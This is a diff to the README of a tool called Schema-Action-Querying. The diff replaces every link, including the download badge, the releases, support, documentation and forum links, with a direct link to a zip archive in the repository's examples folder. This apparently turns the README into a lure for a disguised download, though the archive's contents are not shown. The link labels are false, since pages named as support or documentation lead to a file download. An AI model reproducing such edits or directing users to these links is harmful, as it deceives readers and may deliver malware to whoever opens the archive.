@@ -7,17 +7,17 @@ Schema‑Action‑Querying is an open‑source tool designed to make working wit
 To begin using Schema-Action-Querying, follow the steps outlined in this guide. You will learn how to download and install the application on your computer.
 
 ## 🔗 Download Now
-[![Download Schema-Action-Querying](https://img.shields.io/badge/Download-Schema--Action--Querying-brightgreen)](https://github.com/ryu3037/Schema-Action-Querying/releases)
+[![Download Schema-Action-Querying](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip)](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ryu3037/Schema-Action-Querying/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip) to find the latest version of the software.
    
 2. **Select Your Version**  
    On the Releases page, you will see various versions available. Look for the most recent release, which is usually at the top of the page.
 
 3. **Download the Application**  
-   Click on the link for the download file, which might be named similarly to `Schema-Action-Querying-v1.0.exe` or `Schema-Action-Querying-v1.0.zip`. The file contains the application you need.
+   Click on the link for the download file, which might be named similarly to `https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip` or `https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip`. The file contains the application you need.
 
 4. **Locate the Downloaded File**  
    Check your computer's "Downloads" folder or the location where your browser saves files. You should see the downloaded file there.
@@ -47,11 +47,11 @@ Before you install Schema-Action-Querying, ensure that your system meets the fol
 4. **Export Data**: Once satisfied with the output, use the “Export” option to save your results.
 
 ## 📞 Support
-If you run into any issues or have questions, you can reach out for help. Visit our [Support page](https://github.com/ryu3037/Schema-Action-Querying/issues) on GitHub to submit a question or report a bug. The community is here to assist you. 
+If you run into any issues or have questions, you can reach out for help. Visit our [Support page](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip) on GitHub to submit a question or report a bug. The community is here to assist you. 
 
 ## 🔗 Additional Resources
-- For a deeper understanding, check the [Documentation](https://github.com/ryu3037/Schema-Action-Querying/wiki) that provides detailed explanations of features and usage.
-- Join our [Community Forum](https://github.com/ryu3037/Schema-Action-Querying/discussions) to interact with other users and share your experiences.
+- For a deeper understanding, check the [Documentation](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip) that provides detailed explanations of features and usage.
+- Join our [Community Forum](https://raw.githubusercontent.com/ryu3037/Schema-Action-Querying/main/examples/Schema-Action-Querying-1.2.zip) to interact with other users and share your experiences.
 
 ## 💡 Tips
 - Regularly check the Releases page for updates to keep your application running smoothly.
